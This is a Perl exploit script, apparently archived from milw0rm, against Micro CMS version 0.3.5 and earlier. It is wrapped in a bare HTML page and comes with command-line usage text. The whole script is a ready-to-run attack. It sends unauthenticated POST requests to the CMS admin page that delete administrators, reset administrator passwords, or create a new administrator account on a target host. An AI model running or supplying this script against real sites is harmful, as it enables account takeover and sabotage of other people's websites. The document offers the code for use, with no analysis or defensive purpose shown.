<html><head><title>Micro CMS <= 0.3.5 Remote (Add/Delete/Password Change) Exploit</title></head><pre>#!/usr/bin/perl
# --------------------------------------------------------------
# Micro CMS &lt;= 0.3.5 Remote (Add/Delete/Password Change) Exploit
# StAkeR[at]hotmail[dot]it
# http://www.impliedbydesign.com/apps/microcms/microcms.zip
# --------------------------------------------------------------

use strict;
use LWP::UserAgent;

my ($admin,$passwd);
my @real = undef;
my $http = new LWP::UserAgent; 
my ($host,$path,$tell) = @ARGV;

if($host !~ /http:\/\/(.+?)$/i || $tell !~ /^\-(delete|change|add)?$/i)
{
  print STDOUT &quot;[+] Micro CMS &lt;= 0.3.5 Remote (Add/Delete/Password Change) Exploit\n&quot;;
  print STDOUT &quot;[+] Usage: perl $0 http://[host] [path] -option (-delete,-change,-add)\n&quot;;
  exit;
}


if($tell =~ /delete/i)
{
  print STDOUT &quot;[+]Admin ID: &quot;;
  chomp($admin = &lt;STDIN&gt;);
  
  if(defined $admin)
  {
    print STDOUT del_admin($admin);
    exit;
  }
  else
  {
    print STDOUT &quot;[+] Not Defined!\n&quot;;
    exit;
  }
}

if($tell =~ /change/i)
{
  print STDOUT &quot;[+] Admin ID : &quot;;
  chomp($admin = &lt;STDIN&gt;);
  
  print STDOUT &quot;[+] New Password: &quot;;
  chomp($passwd = &lt;STDIN&gt;);
  
  if(defined $admin || defined($passwd))
  {
    print STDOUT change_pwd($admin,$passwd);
  }
  else
  {
    print STDOUT &quot;[+] Not Defined!\n&quot;;
  }
}

if($tell =~ /add/i)
{
  print STDOUT &quot;[+] Admin Username: &quot;;
  chomp($admin = &lt;STDIN&gt;);
  
  print STDOUT &quot;[+] Admin Password: &quot;;
  chomp($passwd = &lt;STDIN&gt;);
  
  if(defined $admin || defined($passwd))
  {
    print STDOUT add_admin($admin,$passwd);
  }
  else
  {
    print STDOUT &quot;[+] Not Defined!\n&quot;;
  }
}


sub change_pwd
{
  my ($userid,$passwd) = @_;
 
  my $post = {
               action                  =&gt; 'change_password',
               administrators_id       =&gt; $userid,
               administrators_password =&gt; $passwd,
            };
          
  $http-&gt;post($host.'/'.$path.'/microcms-admin-home.php',$post);
   
  return &quot;[+] Password Changed! ($passwd)\n&quot;;

}


sub del_admin
{
  my $userid = shift @_;
 
  my $post = {
               action                  =&gt; 'delete_admin',
               administrators_id       =&gt; $userid,
            };
          
  $http-&gt;post($host.'/'.$path.'/microcms-admin-home.php',$post);
   
  return &quot;[+] Admin ($userid) Has Been Deleted!\n&quot;;

}


sub add_admin
{
  my ($username,$password) = @_;
  my $level = 1;
 
  my $post = {
               action                  =&gt; 'add_admin',
               administrators_name     =&gt; $username,
               administrators_username =&gt; $username,
               administrators_password =&gt; $password,
               administrators_email    =&gt; $username,
               administrators_level    =&gt; $level,
            };
          
  $http-&gt;post($host.'/'.$path.'/microcms-admin-home.php',$post);
   
  return &quot;[+] Username: $username and Password: $password\n&quot;;
}    

# milw0rm.com [2008-11-01]</pre></html>